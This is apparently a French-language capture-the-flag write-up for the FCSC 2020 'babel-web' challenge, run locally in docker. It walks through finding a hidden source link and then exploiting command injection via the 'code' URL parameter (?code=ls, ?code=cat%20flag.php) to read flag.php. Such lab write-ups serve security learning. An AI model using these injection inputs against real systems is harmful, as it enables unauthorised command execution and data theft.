# ETAPE 1:
Pour commencer, téléchargez le fichier docker-compose.yml :
curl https://hackropole.fr/challenges/fcsc2020-web-babel-web/docker-compose.public.yml -o docker-compose.yml
# ETAPE 2:
Lancez l'épreuve en exécutant dans le même dossier :
docker compose up
# ETAPE 3:
Accéder à l'épreuve à l'adresse http://localhost:8000/.
# ETAPE 4:
  Nous pouvons avoir un peu plus d'information avec extention wappalyzer
  OS:DEBIAN
  WEB: Apache 2.4.54
  PHP: 7.4.33
  
  Le premier constat est que le site n'est pas sécurisé (HTTPS)
  
  Avec le mode debugeur de EDGE (F12), nous avons une section en commentaire
    <!-- <a href="?source=1">source</a> -->
  Il faut decommenter cette section : <a href="?source=1">source</a>
  Reactualisez la page, nous avons maintenant un lien sources
  
  Acceder sur le site http://localhost:8000/?code=ls
    la cmd ls permet de lister les fichiers sous linux via la variable code
  le resultat est deux fichiers qui s'affichent dans votre navigateur 
    flag.php
    index.php
  Acceder mainteant http://localhost:8000/?code=cat%20flag.php
    la cmd cat permet afficher le contenu et  la chaine de caractères %20 pour remplacer l’espace dans l’url
  Nous pouvons recuperer le $flad dans le debugeur du navigateur
